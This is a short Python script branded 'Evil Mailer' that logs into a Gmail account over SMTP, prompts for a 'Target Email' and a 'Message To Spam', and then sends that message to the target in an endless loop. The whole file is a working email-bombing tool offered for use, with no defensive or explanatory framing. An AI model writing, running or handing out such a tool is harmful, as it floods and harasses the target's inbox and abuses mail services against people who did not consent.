try:
	import smtplib
	import os
	import time
	import sys
	from colorama import Fore, Style
	import threading
	from pyfiglet import Figlet
	import getpass
except ImportError as ie:
	print(ie)
def send_mail():
	print(Fore.RED + Style.BRIGHT + ">> [!] Enable Less Secure Apps For Your Account Or It Wont Work!")
	time.sleep(2)
	try:
		user_email = input(Fore.CYAN + Style.BRIGHT + ">> [?] Enter Your Email: ")
		time.sleep(1)
		user_password = getpass.getpass(Fore.CYAN + Style.BRIGHT + ">> [?] Enter Your Password: ")
		time.sleep(2)
		print(Fore.RED + Style.BRIGHT + ">> [*] Initiating Login Using Your Account.......")
		smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
		print(Fore.GREEN + Style.BRIGHT + ">> [+] Successfully Initiated A Connection To Google's SMTP Servers")
		time.sleep(1)
		smtpserver.ehlo()
		smtpserver.starttls()
		smtpserver.login(user_email, user_password)
		time.sleep(2)
		print(Fore.GREEN + Style.BRIGHT + ">> [+] Successfully Logged in as " + str(user_email))
		time.sleep(1)
		target_email = input(Fore.CYAN + Style.BRIGHT + ">> [?] Enter Target Email: ")
		time.sleep(1)
		msg = input(Fore.CYAN + Style.BRIGHT + ">> [*] Enter Message To Spam: ")
		while True:
			smtpserver.sendmail(user_email, target_email, msg)
			print(Fore.GREEN + Style.BRIGHT + ">> [+] Email Sent")
	except Exception as e:
		print(Fore.RED + Style.BRIGHT + "Problem Encountered: " + str(e))
		time.sleep(1)
		sys.exit()

custom_fig = Figlet(font='avatar')
print(Fore.CYAN + Style.BRIGHT + custom_fig.renderText('Evil Mailer'))

a = threading.Thread(target=send_mail())
a.start()
